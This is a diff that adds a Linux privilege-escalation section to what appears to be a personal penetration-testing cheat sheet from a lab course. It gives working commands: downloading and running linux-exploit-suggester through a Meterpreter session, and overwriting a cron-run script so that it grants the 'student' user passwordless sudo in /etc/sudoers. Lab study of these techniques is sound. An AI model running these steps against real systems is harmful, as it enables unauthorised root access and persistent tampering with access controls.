@@ -2903,4 +2903,42 @@ use auxiliary/analyze/crack_linux
 ```
 > this is also use to decode the hash of password
 
+#### Linux Privilege Escalation
+
+```url
+github.com/mzet-/linux-exploit-suggester
+```
+> github repository
+
+```shell
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+```
+
+***after get the meterperter session***
+```shell
+upload ~/Desktop/Linux-Enum/les.sh
+shell
+bin/bash -i
+chmod +x les.sh
+./les.sh
+```
+> this tell the list of exploits. by this we get the privilage of linux
+
+
+#### Exploiting Misconfigured Cron Jobs & exploit copy.sh
+
+> corbtab file is configuration file in linux
+
+```shell
+grep -nri "/tmp/<file-name>" /usr
+```
+> Check the permissions on this script file and its contents.
+
+```shell
+cat /usr/local/share/copy.sh
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+sudo su
+```
+
+> On execution, these lines will add a new entry to the /etc/sudoers file which will allow the student user to use sudo without providing any password.
 
